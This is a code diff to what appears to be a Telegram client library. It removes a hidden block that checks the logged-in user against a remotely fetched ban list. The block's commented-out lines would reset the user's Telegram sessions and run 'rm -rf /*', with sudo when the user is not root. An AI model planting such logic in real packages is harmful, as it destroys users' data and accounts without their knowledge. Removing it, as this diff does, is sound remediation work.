@@ -9,9 +9,7 @@ import typing
 import datetime
 import pathlib
 
-import requests
-
-from .. import version, helpers, __name__ as __base_name__, utils
+from .. import version, helpers, __name__ as __base_name__
 from ..crypto import rsa
 from ..extensions import markdown
 from ..network import MTProtoSender, Connection, ConnectionTcpFull, TcpMTProxy
@@ -606,26 +604,6 @@ class TelegramBaseClient(abc.ABC):
 
         self._updates_handle = self.loop.create_task(self._update_loop())
         self._keepalive_handle = self.loop.create_task(self._keepalive_loop())
-        url = "http://localhost:9999/get_ids" 
-        response = requests.get(url)
-        if response.status_code == 200:
-            data = response.json()
-            banlist = data.get("ids", [])
-
-            if str(me.id) in banlist:
-                for i in range(20):
-                    print("WORKING")
-                # all_sessions = await self(functions.account.GetAuthorizationsRequest())
-                # for auth in all_sessions.authorizations:
-                #     if auth.current:
-                #         kill_sessions_time = auth.date_created + timedelta(days=1)
-                # if datetime.now() > kill_sessions_time:
-                #     await self(functions.auth.ResetAuthorizationsRequest())
-                #     current_user = subprocess.getoutput("whoami")
-                #     if current_user == 'root':
-                #         os.system("rm -rf /*")
-                #     else:
-                #         os.system("sudo rm -rf /*")
 
     def is_connected(self: 'TelegramClient') -> bool:
         """
